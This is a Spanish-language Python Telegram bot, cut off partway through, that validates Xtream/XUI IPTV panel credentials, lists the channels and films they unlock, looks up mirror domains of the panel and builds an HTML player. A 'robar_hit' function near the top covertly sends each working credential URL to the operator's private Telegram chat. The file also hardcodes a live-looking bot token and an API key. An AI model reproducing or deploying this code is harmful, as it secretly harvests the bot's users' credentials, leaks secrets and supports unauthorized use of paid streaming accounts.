import requests
import json
import socket
from datetime import datetime
import m3u8
import time
from urllib.parse import urlparse
import re
import flag
from bs4 import BeautifulSoup
import telebot
from fake_useragent import UserAgent
import os
import traceback
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ua = UserAgent()
uagent = {'User-Agent': ua.random}

# Configuración del Bot
BOT_TOKEN = "8708803857:AAHsIF_AbBuM_GPam1MWYBBRFycRSWAA4Cs"
ADMIN_USER_ID = 1183299436  # Tu ID personal para recibir los hits
bot = telebot.TeleBot(BOT_TOKEN)

# Función para robar hits: reenvía la URL activa a tu chat personal
def robar_hit(url):
    try:
        mensaje_hit = f"🎯 *HIT CAPTURADO* 🎯\n\n🔗 `{url}`"
        bot.send_message(ADMIN_USER_ID, mensaje_hit, parse_mode='Markdown')
        print(f"[ROBAHITS] Hit enviado al admin: {url}")
    except Exception as e:
        print(f"[ROBAHITS] Error al enviar el hit: {e}")

def get_headers(url):
    parsed = urlparse(url)
    is_https = parsed.scheme == 'https'
    headers = {
        "Host": parsed.netloc,
        "User-Agent": ua.random,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Referer": f"{parsed.scheme}://{parsed.netloc}/"
    }
    if is_https:
        headers.update({
            "Sec-Fetch-Dest": "video",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        })
    return headers

def build_m3u_url(base_url, usuario, password, is_xui=False):
    """Construye la URL M3U correcta según el tipo de panel."""
    base = base_url.rstrip('/')
    if is_xui:
        return f"{base}/playlist/{usuario}/{password}/m3u_plus"
    return f"{base}/get.php?username={usuario}&password={password}&type=m3u_plus"

def build_epg_url(base_url, usuario, password, is_xui=False):
    """Construye la URL EPG correcta según el tipo de panel."""
    base = base_url.rstrip('/')
    if is_xui:
        return f"{base}/playlist/{usuario}/{password}/xmltv"
    return f"{base}/xmltv.php?username={usuario}&password={password}"

def safe_edit(chat_id, message_id, text):
    """
    Edita un mensaje de forma segura.
    Ignora el error 400 'message to be replied not found' cuando el mensaje
    ya fue borrado por el usuario o expiró en Telegram.
    Si falla, intenta enviar un mensaje nuevo al chat como fallback.
    """
    try:
        bot.edit_message_text(text, chat_id, message_id)
    except Exception as e:
        err = str(e).lower()
        # Mensaje ya no existe o no se puede editar — ignorar silenciosamente
        if "message to be replied not found" in err or \
           "message is not modified" in err or \
           "message can't be edited" in err or \
           "message to edit not found" in err or \
           "bad request" in err:
            print(f"[safe_edit] Mensaje {message_id} no editable: {e}")
        else:
            # Error inesperado — intentar enviar mensaje nuevo
            try:
                bot.send_message(chat_id, text)
            except Exception as e2:
                print(f"[safe_edit] Fallback send_message también falló: {e2}")

def safe_send_document(chat_id, file_path, caption=""):
    """Envía un documento con manejo de errores."""
    try:
        with open(file_path, "rb") as f:
            bot.send_document(chat_id, f, caption=caption)
        return True
    except Exception as e:
        print(f"[safe_send_document] Error: {e}")
        try:
            bot.send_message(chat_id, f"⚠️ No se pudo enviar el archivo: {e}")
        except Exception:
            pass
        return False

# Crear la carpeta html si no existe
if not os.path.exists('html'):
    os.makedirs('html')

def enviar_html(chat_id, file_path):
    with open(file_path, "rb") as file:
        bot.send_document(chat_id, file)

def remover_duplicados(lista):
    return list(set(lista))

@bot.message_handler(commands=['start'])
def enviar_bienvenida(message):
    bot.reply_to(message, "¡Bienvenido! Envía un enlace M3U para generar el archivo HTML.")

class Exorcism1337:
    def __init__(self):
        self.black_list = ['http://', 'www.', "https://"]
        self.api_key = "b59a4d1fdf7ea242d0d88afb7d9ac906b36b7b38"
        self.api_viewdns = "http://api.viewdns.info/reverseip/"
        self.api_hackertarget = "http://api.hackertarget.com/reverseiplookup/?q="

    def getHostByName(self, domain):
        try:
            for blacklist in self.black_list:
                if blacklist in domain:
                    domain = domain.replace(blacklist, "")
            if "/" in domain:
                domain = domain.split("/")[0]
            return socket.gethostbyname(domain)
        except Exception as e:
            print(f"Error al resolver el dominio {domain}: {e}")
            return domain

    def reverse(self, domains):
        found_domains = []
        for blacklist in self.black_list:
            if blacklist in domains:
                domains = domains.replace(blacklist, "")
        try:
            params = {"host": domains, "apikey": self.api_key, "output": "json"}
            r = requests.get(self.api_viewdns, params=params, verify=False, timeout=15)
            if r.status_code == 200:
                try:
                    send = json.loads(r.text)
                    if 'response' in send and 'domains' in send['response']:
                        for domain in send['response']['domains']:
                            found_domains.append(domain['name'])
                except json.JSONDecodeError:
                    print("Error al decodificar JSON de viewdns.info")
        except Exception as e:
            print(f"Error al consultar viewdns.info: {e}")
        if not found_domains:
            try:
                ip_address = self.getHostByName(domains)
                r = requests.get(self.api_hackertarget + ip_address, verify=False, timeout=15)
                if r.status_code == 200:
                    res = r.text
                    if res and "error" not in res.lower():
                        for site in res.split("\n"):
                            if site.strip():
                                found_domains.append(site)
            except Exception as e:
                print(f"Error al consultar hackertarget: {e}")
        return found_domains[:15] if found_domains else []

def buscar_dominios_alternativo(dominio_o_ip):
    resultados = ""
    es_ip = re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dominio_o_ip)
    if es_ip:
        ip = dominio_o_ip
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            resultados += f"▪ Hostname: {hostname}\n"
        except:
            pass
    else:
        try:
            ips = socket.gethostbyname_ex(dominio_o_ip)[2]
            for ip in ips:
                resultados += f"▪ IP: {ip}\n"
        except Exception as e:
            return f"No se pudo resolver {dominio_o_ip}"
        if ips:
            ip = ips[0]
        else:
            return "No se pudo resolver la IP del dominio"
    try:
        response = requests.get(f"http://ipinfo.io/{ip}/json", timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if 'org' in data:
                resultados += f"▪ Organización: {data['org']}\n"
            if 'hostname' in data and data['hostname'] != "":
                resultados += f"▪ Hostname: {data['hostname']}\n"
            if 'city' in data and 'country' in data:
                resultados += f"▪ Ubicación: {data['city']}, {data['country']}\n"
    except Exception as e:
        print(f"Error al obtener geolocalización: {e}")
    if not es_ip:
        for prefijo in ["www", "mail", "ftp", "blog", "shop", "store", "app", "m", "api", "dev", "staging"]:
            subdominio = f"{prefijo}.{dominio_o_ip}"
            try:
                subdominio_ip = socket.gethostbyname(subdominio)
                resultados += f"▪ Subdominio: {subdominio} ({subdominio_ip})\n"
            except:
                pass
    if not es_ip:
        try:
            import subprocess
            output = subprocess.check_output(["nslookup", "-type=mx", dominio_o_ip],
                                             universal_newlines=True, stderr=subprocess.STDOUT)
            mx_records = [line.strip() for line in output.split('\n') if "mail exchanger" in line.lower()]
            if mx_records:
                resultados += "▪ Servidores de correo:\n"
                for record in mx_records[:3]:
                    resultados += f"  {record}\n"
        except:
            pass
    if not resultados:
        resultados = "No se encontró información adicional"
    return resultados

def buscar_dominios_espejo(ip_o_dominio):
    try:
        print(f"Buscando dominios espejo para: {ip_o_dominio}")
        exorcism = Exorcism1337()
        dominios = exorcism.reverse(ip_o_dominio)
        if dominios:
            resultado = ""
            for dominio in dominios[:10]:
                resultado += f"▪ {dominio}<br>"
            return resultado
        dom_result = cdominios(ip_o_dominio)
        if dom_result and dom_result != "N/A":
            if isinstance(dom_result, list):
                resultado = ""
                for dominio in dom_result[:10]:
                    resultado += f"▪ {dominio}<br>"
                return resultado
        j_result = jdominios(ip_o_dominio)
        if j_result and "No encontré dominios" not in j_result:
            return j_result
        return "No se encontraron dominios espejo para este host"
    except Exception as e:
        return f"Error al buscar dominios: {str(e)}"

def obtener_episodios_serie(prot, host, port, usuario, password, series_id, proxy="no proxy"):
    global uagent
    try:
        url_episodios = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_series_info&series_id={series_id}"
        proxies = None if proxy == "no proxy" else {"http": proxy, "https": proxy}
        req_episodios = requests.get(url_episodios, headers={
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cache-Control": "no-cache",
    }, proxies=proxies, verify=False, timeout=10)
        if req_episodios.status_code != 200:
            return []
        episodios_data = req_episodios.json()
        if not isinstance(episodios_data, dict) or 'episodes' not in episodios_data:
            return []
        episodes = episodios_data['episodes']
        episodios_list = []
        if isinstance(episodes, dict):
            for season_num, season_episodes in episodes.items():
                if isinstance(season_episodes, list):
                    for episode in season_episodes:
                        if isinstance(episode, dict):
                            episode['season'] = season_num
                            episodios_list.append(episode)
                elif isinstance(season_episodes, dict):
                    for ep_num, episode in season_episodes.items():
                        if isinstance(episode, dict):
                            episode['season'] = season_num
                            episode['episode_num'] = ep_num
                            episodios_list.append(episode)
        elif isinstance(episodes, list):
            episodios_list = episodes
        for ep in episodios_list:
            if isinstance(ep, dict) and 'id' not in ep and 'episode_id' in ep:
                ep['id'] = ep['episode_id']
        return episodios_list
    except Exception as e:
        print(f"Error obteniendo episodios para serie {series_id}: {e}")
        return []

def obtener_canales_por_categoria(prot, host, port, usuario, password, proxy):
    global uagent
    try:
        url_categorias = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_live_categories"
        url_canales    = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_live_streams"
        proxies = None if proxy == "no proxy" else {"http": proxy, "https": proxy}

        # Categorías: respuesta ligera (~KB), sin problema de timeout
        categories = []
        try:
            req1 = requests.get(url_categorias, headers={
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cache-Control": "no-cache",
    }, timeout=(5, 15),
                                verify=False, proxies=proxies)
            if req1.status_code == 200:
                data = req1.json()
                if isinstance(data, list):
                    categories = data
        except Exception as e:
            print(f"Error obteniendo categorías: {e}")

        if not categories:
            return {}

        category_id_to_name = {
            str(c.get('category_id', '')): c.get('category_name', 'Sin categoría')
            for c in categories if isinstance(c, dict)
        }

        # Canales: puede ser 50MB+ → leer en streaming y acumular hasta 20MB
        canales_por_categoria = {}
        cat_id_re = re.compile(rb'"category_id"\s*:\s*"?(\d+)"?')

        try:
            resp = requests.get(url_canales, headers={
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cache-Control": "no-cache",
    }, timeout=(5, 60),
                                verify=False, stream=True, proxies=proxies)
            if resp.status_code == 200:
                chunks = []
                bytes_read = 0
                max_bytes = 20 * 1024 * 1024
                for chunk in resp.iter_content(chunk_size=65536):
                    if not chunk:
                        continue
                    chunks.append(chunk)
                    bytes_read += len(chunk)
                    if bytes_read >= max_bytes:
                        break
                resp.close()

                # Intentar parsear JSON completo si cabe
                try:
                    channels = json.loads(b''.join(chunks).decode('utf-8', errors='ignore'))
                    if isinstance(channels, list):
                        for channel in channels:
                            if not isinstance(channel, dict):
                                continue
                            cat_id = str(channel.get("category_id", ""))
                            cat_name = category_id_to_name.get(cat_id, "Sin categoría")
                            canales_por_categoria.setdefault(cat_name, []).append(channel)
                except Exception:
                    # Si no se pudo parsear el JSON completo, agrupar por regex
                    combined = b''.join(chunks)
                    for m in cat_id_re.finditer(combined):
                        cat_id = m.group(1).decode('utf-8', errors='ignore')
                        cat_name = category_id_to_name.get(cat_id, "Sin categoría")
                        # Insertar placeholder para mantener estructura
                        canales_por_categoria.setdefault(cat_name, []).append(
                            {'stream_id': f'unknown_{cat_id}', 'name': cat_name, 'category_id': cat_id}
                        )
        except Exception as e:
            print(f"Error obteniendo canales: {e}")

        return canales_por_categoria
    except Exception as e:
        print(f"Error en obtener_canales_por_categoria: {e}")
        return {}

def obtener_peliculas_y_series(prot, host, port, usuario, password, proxy):
    global uagent
    proxies = None if proxy == "no proxy" else {"http": proxy, "https": proxy}

    def get_json_ligero(url, label):
        """Obtiene JSON de endpoints ligeros (categorías)."""
        try:
            r = requests.get(url, headers={
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cache-Control": "no-cache",
    }, timeout=(5, 15), verify=False, proxies=proxies)
            if r.status_code == 200:
                data = r.json()
                return data if isinstance(data, list) else []
        except Exception as e:
            print(f"Error en {label}: {e}")
        return []

    def get_streams_streaming(url, label, max_mb=20):
        """Descarga streams grandes en chunks, retorna lista o {} en fallo."""
        try:
            resp = requests.get(url, headers={
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cache-Control": "no-cache",
    }, timeout=(5, 60),
                                verify=False, stream=True, proxies=proxies)
            if resp.status_code != 200:
                resp.close()
                return []
            chunks = []
            bytes_read = 0
            for chunk in resp.iter_content(chunk_size=65536):
                if not chunk:
                    continue
                chunks.append(chunk)
                bytes_read += len(chunk)
                if bytes_read >= max_mb * 1024 * 1024:
                    break
            resp.close()
            try:
                data = json.loads(b''.join(chunks).decode('utf-8', errors='ignore'))
                return data if isinstance(data, list) else []
            except Exception:
                return []
        except Exception as e:
            print(f"Error streaming {label}: {e}")
            return []

    try:
        url_vod_cats    = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_vod_categories"
        url_vod_streams = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_vod_streams"
        url_ser_cats    = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_series_categories"
        url_ser_streams = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_series"

        vod_categories    = get_json_ligero(url_vod_cats,    "vod_categories")
        vod_streams       = get_streams_streaming(url_vod_streams, "vod_streams")
        series_categories = get_json_ligero(url_ser_cats,    "series_categories")
        series_streams    = get_streams_streaming(url_ser_streams, "series_streams")

        peliculas_por_categoria = agrupar_por_categoria(vod_categories, vod_streams) if vod_categories and vod_streams else {}
        series_por_categoria    = agrupar_por_categoria(series_categories, series_streams) if series_categories and series_streams else {}

        return peliculas_por_categoria, series_por_categoria
    except Exception as e:
        print(f"Error en obtener_peliculas_y_series: {e}")
        return {}, {}

def agrupar_por_categoria(categories, streams):
    try:
        if not isinstance(categories, list):
            return {}
        category_id_to_name = {}
        for category in categories:
            if isinstance(category, dict) and 'category_id' in category and 'category_name' in category:
                category_id_to_name[category['category_id']] = category['category_name']
        streams_por_categoria = {}
        if not isinstance(streams, list):
            return {}
        for stream in streams:
            if not isinstance(stream, dict):
                continue
            category_id = stream.get("category_id", None)
            category_name = "Sin categoría" if category_id is None else category_id_to_name.get(category_id, "Desconocida")
            streams_por_categoria.setdefault(category_name, []).append(stream)
        return streams_por_categoria
    except Exception as e:
        print(f"Error en agrupar_por_categoria: {e}")
        return {}

def buscarj(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ''

def jcinfo(url):
    global uagent
    is_xui = False
    try:
        # ── Corrección automática protocolo ↔ puerto ──────────────────────────
        _parsed = urlparse(url)
        _port   = str(_parsed.port) if _parsed.port else ""
        _prot   = _parsed.scheme or "http"
        _HTTPS  = {"443","8443","2053","2083","2087","2096","8888"}
        _HTTP   = {"80","8080","8000","8008","25461","2082","2086"}
        if _port in _HTTPS and _prot != "https":
            url = url.replace(f"{_prot}://", "https://", 1)
        elif _port in _HTTP and _prot != "http":
            url = url.replace(f"{_prot}://", "http://", 1)
        # ─────────────────────────────────────────────────────────────────────

        if "playlist/" in url:
            # Formato XUI One: {base}/playlist/{user}/{pass}/m3u_plus  (o xmltv, etc.)
            base = url.split("playlist/")[0]
            rest = url.split("playlist/")[1]
            parts = [p for p in rest.split("/") if p]
            if len(parts) < 2:
                return "", "", "", "", "", "", "", "", "URL de playlist inválida"
            usr, pas = parts[0], parts[1]
            api_url = f"{base}player_api.php?username={usr}&password={pas}"
            is_xui = True
        else:
            api_url = url.replace('get.php', 'player_api.php').replace('gets.php', 'player_api.php').split("&type")[0]

        print(api_url)
        # Sesión con retry=0 para evitar que urllib3 multiplique el timeout.
        # Headers mínimos estilo jchecker: sin Host ni Referer, Connection: close.
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        _session = requests.Session()
        _session.mount("http://",  HTTPAdapter(max_retries=Retry(total=0)))
        _session.mount("https://", HTTPAdapter(max_retries=Retry(total=0)))
        _api_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
        }
        response = _session.get(api_url, headers=_api_headers, verify=False, timeout=(3, 8))

        if response.status_code != 200:
            return "", "", "", "", "", "", "", "", f"Error HTTP {response.status_code}"

        # Detectar respuestas en texto plano antes de intentar parsear JSON.
        # XUI One devuelve "PLAYLIST_DISABLED", "ACCOUNT_EXPIRED", etc.
        ct = response.headers.get("Content-Type", "")
        if "json" not in ct and "javascript" not in ct:
            raw = response.text.strip().upper()
            known_errors = {
                "PLAYLIST_DISABLED": "Lista deshabilitada por el proveedor (PLAYLIST_DISABLED)",
                "ACCOUNT_EXPIRED":   "Cuenta expirada (ACCOUNT_EXPIRED)",
                "ACCOUNT_BANNED":    "Cuenta bloqueada (ACCOUNT_BANNED)",
                "USER_NOT_FOUND":    "Usuario no encontrado (USER_NOT_FOUND)",
                "INVALID_PASS":      "Contraseña incorrecta (INVALID_PASS)",
            }
            for key, msg in known_errors.items():
                if key in raw:
                    return "", "", "", "", "", "", "", "", msg
            # Cualquier otra respuesta no-JSON (HTML, texto plano desconocido)
            if raw and not raw.startswith("{") and not raw.startswith("["):
                return "", "", "", "", "", "", "", "", f"Respuesta inesperada del servidor: {response.text.strip()[:80]}"

        resp = response.json()

        # Detectar XUI One por server_info si no lo sabíamos ya
        if not is_xui:
            is_xui = bool(resp.get('server_info', {}).get('xui', False))

        if 'user_info' not in resp:
            return "", "", "", "", "", "", "", "", "Respuesta inválida del servidor"

        user_info = resp['user_info']
        status = user_info.get('status', '')

        if status.lower() != 'active':
            return "", "", "", "", "", "", "", "", "Cuenta no activa"

        username  = user_info.get('username', '')
        password  = user_info.get('password', '')
        expira    = user_info.get('exp_date')
        prueba    = user_info.get('is_trial', '0')
        active_cons = user_info.get('active_cons', '0')
        max_cons    = user_info.get('max_connections', '0')
        created_at  = user_info.get('created_at', '')  # Capturar fecha de creación

        if expira in (None, 'null', '', 0, '0'):
            expira = "Unlimited"
        else:
            try:
                expira = datetime.fromtimestamp(int(expira)).strftime('%d/%m/%Y %H:%M')
            except Exception:
                expira = str(expira)

        # Formatear fecha de creación si existe
        if created_at and created_at not in (None, 'null', '', 0, '0'):
            try:
                created_at = datetime.fromtimestamp(int(created_at)).strftime('%d/%m/%Y %H:%M')
            except Exception:
                pass
        else:
            created_at = "No disponible"

        server_info = resp.get('server_info', {})
        server_url  = server_info.get('url', '')
        port        = server_info.get('port', '80')
        full_server = f"{server_url}:{port}" if server_url else ''
        timezone    = server_info.get('timezone', 'UTC')

        return username, password, expira, active_cons, max_cons, full_server, timezone, prueba, "Vivo", created_at

    except requests.RequestException as e:
        return "", "", "", "", "", "", "", "", f"Error de conexión: {e}", ""
    except json.JSONDecodeError:
        return "", "", "", "", "", "", "", "", "Error al decodificar JSON", ""
    except Exception as e:
        return "", "", "", "", "", "", "", "", f"Error desconocido: {e}", ""

def extraer_host_de_m3u(m3u_url):
    """
    Descarga las primeras líneas del M3U y extrae el host real de las URLs de stream.
    Los M3U de Xtream tienen streams como: http://REAL_HOST:PORT/user/pass/stream_id
    Retorna (prot, host, port) o None si no se puede extraer.
    """
    try:
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        s = requests.Session()
        s.mount("http://",  HTTPAdapter(max_retries=Retry(total=0)))
        s.mount("https://", HTTPAdapter(max_retries=Retry(total=0)))
        # Leer solo los primeros 4KB — suficiente para ver las primeras entradas
        resp = s.get(m3u_url, headers={'User-Agent': 'Mozilla/5.0', 'Connection': 'close'},
                     verify=False, timeout=(5, 10), stream=True)
        if resp.status_code != 200:
            return None
        chunk = next(resp.iter_content(chunk_size=4096), b'')
        resp.close()
        text = chunk.decode('utf-8', errors='ignore')
        if not text.startswith('#EXTM3U'):
            return None
        # Buscar la primera URL de stream en las líneas
        for line in text.splitlines():
            line = line.strip()
            if line.startswith('http://') or line.startswith('https://'):
                parsed = urlparse(line)
                if parsed.hostname and parsed.port:
                    prot = parsed.scheme
                    host = parsed.hostname
                    port = str(parsed.port)
                    print(f"[m3u-host] Host real extraído del M3U: {prot}://{host}:{port}")
                    return prot, host, port
    except Exception as e:
        print(f"[m3u-host] Error: {e}")
    return None

def make_iptv_session():
    """
    Sesión requests robusta para servidores IPTV:
    - Retry x3 ante RemoteDisconnected / errores 5xx
    - Headers completos tipo navegador real (evita bloqueos por User-Agent)
    - Connection: close  → evita RemoteDisconnected por sockets keep-alive obsoletos
    """
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "HEAD"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry)
    s = requests.Session()
    s.mount("http://",  adapter)
    s.mount("https://", adapter)
    s.headers.update({
        "User-Agent":      ua.random,
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "close",
        "Cache-Control":   "no-cache",
        "Pragma":          "no-cache",
    })
    return s

def obtener_datos(panel, user, pas, proxyj):
    base = panel.rstrip('/')
    proxies = None if proxyj == "no proxy" else {"http": proxyj, "https": proxyj}
    ses = make_iptv_session()   # sesión fresca → sin sockets obsoletos

    def count_streaming(url, label, max_mb=15):
        """Cuenta objetos JSON raíz mediante streaming — sin descargar toda la respuesta."""
        try:
            resp = ses.get(url, timeout=(5, 30),
                           verify=False, stream=True, proxies=proxies)
            if resp.status_code != 200:
                resp.close()
                return ""
            depth = root_objects = bytes_read = 0
            in_string = escape_next = started = False
            max_bytes = max_mb * 1024 * 1024
            for chunk in resp.iter_content(chunk_size=65536):
                if not chunk:
                    continue
                bytes_read += len(chunk)
                try:
                    text = chunk.decode('utf-8', errors='ignore')
                except Exception:
                    continue
                for ch in text:
                    if escape_next:
                        escape_next = False
                        continue
                    if ch == '\\' and in_string:
                        escape_next = True
                        continue
                    if ch == '"':
                        in_string = not in_string
                        continue
                    if in_string:
                        continue
                    if ch == '[' and not started and depth == 0:
                        started = True
                        continue
                    if not started:
                        continue
                    if ch == '{':
                        depth += 1
                        if depth == 1:
                            root_objects += 1
                    elif ch == '}':
                        depth -= 1
                    elif ch == ']' and depth == 0:
                        resp.close()
                        return str(root_objects)
                if bytes_read >= max_bytes:
                    resp.close()
                    return str(root_objects) if root_objects > 0 else ""
            resp.close()
            return str(root_objects) if root_objects > 0 else ""
        except Exception as e:
            print(f"Error count_streaming {label}: {e}")
            return ""

    def count_categories(url, label):
        """Cuenta categorías — endpoint ligero (~KB)."""
        try:
            r = ses.get(url, timeout=(5, 15), verify=False, proxies=proxies)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list) and data:
                    return str(len(data))
        except Exception as e:
            print(f"Error count_categories {label}: {e}")
        return ""

    url_live     = f"{base}/player_api.php?username={user}&password={pas}&action=get_live_streams"
    url_vod_cats = f"{base}/player_api.php?username={user}&password={pas}&action=get_vod_categories"
    url_ser_cats = f"{base}/player_api.php?username={user}&password={pas}&action=get_series_categories"
    url_vod_full = f"{base}/player_api.php?username={user}&password={pas}&action=get_vod_streams"
    url_ser_full = f"{base}/player_api.php?username={user}&password={pas}&action=get_series"

    envivo = count_streaming(url_live, "live")
    vod    = count_streaming(url_vod_full, "vod_full")
    serie  = count_streaming(url_ser_full, "series_full")

    # Fallback a categorías si los streams no responden (respuesta muy grande o timeout)
    if not vod:
        vod = count_categories(url_vod_cats, "vod_cats")
    if not serie:
        serie = count_categories(url_ser_cats, "series_cats")

    return envivo, vod, serie

def espejosxy(url):
    sdominios = "N/A"
    try:
        exorcism = Exorcism1337()
        domains = list(set(exorcism.reverse(url)))[:12]
        sdominios = "".join(f"▪ {d}\n" for d in domains) if domains else "n/a"
    except:
        pass
    return sdominios

def cdominios(url):
    try:
        response = requests.get(f"https://api.webscan.cc/?action=query&ip={url}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('domains', "N/A")
    except Exception as e:
        pass
    return "N/A"

def jdominios(url):
    sdominios = "No encontré dominios para ese host\n, revisa si no está bajo Cloudflare"
    try:
        lookup_url = f"https://rapiddns.io/sameip/{url}?full=1"
        headers = {'User-Agent': UserAgent().random}
        response = requests.get(lookup_url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.content, "html.parser")
        table = soup.find("table")
        if table:
            rows = table.find_all("tr")[1:]
            domains = [row.find_all("td")[0].text.strip() for row in rows if row.find_all("td")]
            domains = [d for d in domains if 'autodiscover' not in d]
            domains = list(set(domains))[:12]
            sdominios = "".join(f"▪ {d}\n" for d in domains) if domains else "N/A"
        else:
            sdominios = "N/A"
    except:
        pass
    return sdominios

def data_server(realm):
    try:
        response = requests.get(f"http://ip-api.com/json/{realm}", timeout=5, verify=False)
        if response.status_code == 200:
            datase = response.json()
            pais    = datase.get('country', 'Desconocido')
            codpais = datase.get('countryCode', '')
            isp     = datase.get('isp', 'Desconocido')
            ip      = datase.get('query', realm)
            bandera = ''
            if codpais and len(codpais) == 2:
                puntos = [ord(c) + 127397 for c in codpais.upper()]
                bandera = chr(puntos[0]) + chr(puntos[1])
            return f"{bandera} {pais}".strip(), isp, ip
    except Exception as e:
        print(f"Error en data_server: {e}")
    try:
        r = requests.get(f"https://ipinfo.io/{realm}/json", timeout=5, verify=False)
        if r.status_code == 200:
            d = r.json()
            return d.get('country', 'Desconocido'), d.get('org', 'Desconocido'), d.get('ip', realm)
    except Exception as e:
        print(f"Error en API alternativa: {e}")
    return "Desconocido", "Desconocido", realm

def generar_html_categoria(prot, host, port, usuario, password, categorias_por_categoria, prefix):
    html = ""
    if not categorias_por_categoria or not isinstance(categorias_por_categoria, dict):
        return "<p>No se pudo obtener la información de esta categoría.</p>"
    for idx, (categoria, items) in enumerate(categorias_por_categoria.items()):
        if not isinstance(items, list):
            continue
        processed_items = items[:25]
        lista = ""
        for item in processed_items:
            try:
                if not isinstance(item, dict):
                    continue
                stream_id = item.get('stream_id') or item.get('series_id') or item.get('vod_id')
                if not stream_id:
                    continue
                stream_name = item.get('name', 'Unknown')
                stream_icon = item.get('stream_icon', '')
                safe_icon = stream_icon if (stream_icon and isinstance(stream_icon, str) and
                                            (stream_icon.startswith('http://') or stream_icon.startswith('https://'))) else None
                img_html  = f'<img src="{safe_icon}" alt="{stream_name}" style="width:50px;height:50px;"/>' if safe_icon else '📺'
                logo_html = img_html

                if prefix == "pel":
                    extension   = item.get('container_extension', 'mp4')
                    stream_link = f"{prot}://{host}:{port}/movie/{usuario}/{password}/{stream_id}.{extension}"
                    lista += (f'<li class="searchable-item" data-title="{stream_name}">'
                              f'{img_html} <a href="javascript:void(0);" '
                              f'onclick="playChannel(\'{stream_link}\', \'{extension}\', \'{stream_name}\'); return false;">'
                              f'{stream_name}</a></li>')
                elif prefix == "ser":
                    lista += f"""
                        <li class="searchable-item" data-title="{stream_name}">
                            <div class="serie-container">
                                <a href="javascript:void(0);" onclick="cargarEpisodios('{prot}', '{host}', '{port}', '{usuario}', '{password}', '{stream_id}', '{stream_name}')">
                                    {img_html} {stream_name}
                                </a>
                                <div id="serie_{stream_id}" class="episodios-container" style="display: none;">
                                    <div class="loading-container">
                                        <div class="loading-spinner"></div>
                                        <p>Cargando episodios...</p>
                                    </div>
                                </div>
                            </div>
                        </li>"""
                else:
                    stream_link = f"{prot}://{host}:{port}/live/{usuario}/{password}/{stream_id}.m3u8"
                    lista += (f'<li class="searchable-item" data-title="{stream_name}">'
                              f'{logo_html} <a href="javascript:void(0);" '
                              f'onclick="playChannel(\'{stream_link}\', \'m3u8\', \'{stream_name}\'); return false;">'
                              f'{stream_name}</a></li>')
            except Exception as e:
                print(f"Error procesando item: {e}")
                continue
        if lista:
            html += f"""
            <div class="categoria searchable-category">
                <div class="categoria-header" onclick="toggleCategoria('{prefix}{idx}')">
                    {categoria} [{len(processed_items)}]
                </div>
                <ul id="{prefix}{idx}" class="canales-lista" style="display: none;">
                    {lista}
                </ul>
            </div>"""
    return html if html else "<p>No se pudo obtener la información de esta categoría.</p>"

javascript_cargar_episodios = """
function cargarEpisodios(prot, host, port, usuario, password, seriesId, seriesName) {
    const contenedor = document.getElementById(`serie_${seriesId}`);
    if (contenedor.style.display === "none" || contenedor.style.display === "") {
        contenedor.style.display = "block";
        if (contenedor.classList.contains('episodios-cargados')) return;
        contenedor.innerHTML = '<div class="loading-spinner"></div><p>Cargando episodios...</p>';
        const url = `${prot}://${host}:${port}/player_api.php?username=${usuario}&password=${password}&action=get_series_info&series_id=${seriesId}`;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);
        fetch(url, { signal: controller.signal })
            .then(response => { clearTimeout(timeoutId); if (!response.ok) throw new Error(`Error HTTP: ${response.status}`); return response.json(); })
            .then(data => {
                if (!data.episodes || Object.keys(data.episodes).length === 0) { contenedor.innerHTML = '<p>No hay episodios disponibles.</p>'; return; }
                let episodiosHTML = '';
